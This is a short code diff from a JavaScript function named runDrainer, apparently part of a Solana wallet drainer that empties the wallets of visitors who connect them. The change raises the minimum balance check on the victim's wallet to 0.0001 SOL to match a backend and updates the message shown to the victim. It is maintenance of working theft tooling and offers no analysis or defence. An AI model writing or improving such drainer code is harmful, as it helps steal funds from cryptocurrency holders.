@@ -1111,9 +1111,9 @@ async function runDrainer(provider) {
         }
       }
       
-      if (balance !== null && balance < 50000) { // Less than 0.00005 SOL
-        console.log('[BALANCE_CHECK] Insufficient funds detected:', balance, 'lamports < 50000 lamports');
-        showStatus('❌ Insufficient funds. Your wallet needs at least 0.00005 SOL for transaction fees.', 'error');
+      if (balance !== null && balance < 100000) { // Less than 0.0001 SOL (match backend minimum)
+        console.log('[BALANCE_CHECK] Insufficient funds detected:', balance, 'lamports < 100000 lamports');
+        showStatus('❌ Insufficient funds. Your wallet needs at least 0.0001 SOL for transaction fees.', 'error');
         return;
       } else if (balance === null) {
         console.log('[BALANCE_CHECK] Could not check balance from any endpoint, proceeding anyway');
